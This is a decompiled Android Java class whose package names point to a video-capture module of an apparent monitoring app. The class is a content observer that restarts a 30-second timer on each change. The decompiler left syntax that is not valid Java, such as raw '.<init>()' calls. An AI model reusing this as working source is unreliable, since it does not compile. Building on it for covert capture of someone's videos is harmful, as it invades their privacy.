package com.vvt.capture.camera.video.b;

import android.database.ContentObserver;
import android.os.CountDownTimer;
import android.os.Handler;
import com.vvt.base.capture.i;
import java.util.concurrent.locks.ReentrantLock;

class d
  extends ContentObserver
{
  private CountDownTimer c;
  private final ReentrantLock d;
  
  d(b paramb, Handler paramHandler, i parami)
  {
    super(paramHandler);
    ReentrantLock localReentrantLock = new java/util/concurrent/locks/ReentrantLock;
    localReentrantLock.<init>();
    this.d = localReentrantLock;
  }
  
  public void onChange(boolean paramBoolean)
  {
    boolean bool = b.a();
    if (bool) {}
    Object localObject1 = this.d;
    ((ReentrantLock)localObject1).lock();
    try
    {
      localObject1 = this.c;
      if (localObject1 != null)
      {
        localObject1 = this.c;
        ((CountDownTimer)localObject1).cancel();
      }
      localObject1 = new com/vvt/capture/camera/video/b/e;
      long l1 = 30000L;
      long l2 = 1000L;
      ((e)localObject1).<init>(this, l1, l2);
      localObject1 = ((e)localObject1).start();
      this.c = ((CountDownTimer)localObject1);
      localObject1 = this.d;
      ((ReentrantLock)localObject1).unlock();
      bool = b.a();
      if (bool) {}
      return;
    }
    finally
    {
      this.d.unlock();
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/camera/video/removeFromPath/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */